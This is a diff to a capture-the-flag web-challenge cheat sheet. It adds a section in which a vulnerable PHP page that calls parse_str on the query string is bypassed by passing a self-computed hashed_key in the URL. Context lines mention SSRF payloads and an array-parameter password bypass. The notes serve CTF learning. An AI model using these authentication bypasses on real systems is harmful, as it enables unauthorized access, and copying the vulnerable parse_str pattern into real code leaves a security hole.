@@ -6,9 +6,41 @@ Sometimes you gotta check out for `/robots.txt`
 ## Website Loopback:
 If a challange asks for Preview a URL, we can use a [Payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) or a [nip](https://nip.io/) or [loopback](https://qiita.com/shimoju/items/81ed5055d2fec5bb9c1e) to exploit a vulnerability in DNS to get the flag
 
-## PHP []
+## PHP
+### PHP []
 When Submit was pressed, a POST request was sent to the server containing:  `password=yourinput`
 We break the application by passing an array as the password:  `password[]=`
+
+### PHP Code Page:
+If you are presented with a page that has a line of PHP code like:
+```php
+<?php
+$hashed_key = '79abe9e217c2532193f910434453b2b9521a94c25ddc2e34f55947dea77d70ff';
+$parsed = parse_url($_SERVER['REQUEST_URI']);
+if(isset($parsed["query"])){
+    $query = $parsed["query"];
+    $parsed_query = parse_str($query);
+    if($parsed_query!=NULL){
+        $action = $parsed_query['action'];
+    }
+
+    if($action==="auth"){
+        $key = $_GET["key"];
+        $hashed_input = hash('sha256', $key);
+        //echo $hashed_input.'\n';
+        if($hashed_input!==$hashed_key){
+            die("GTFO!");
+        }
+
+        echo file_get_contents("/flag");
+    }
+}else{
+    show_source(__FILE__);
+}
+?>
+```
+Then you need to excute the commands in the url line such as `<host>/?action=auth&`  
+So, inorder to get the flag from the above, we need to make our own `key` with `$ echo -n test | sha256sum` that will give us the new key `9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08` and now we execute in the url `<host>/?action=auth&key=test&hashed_key=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08` which will give us the flag
 
 ## Web Upload
 
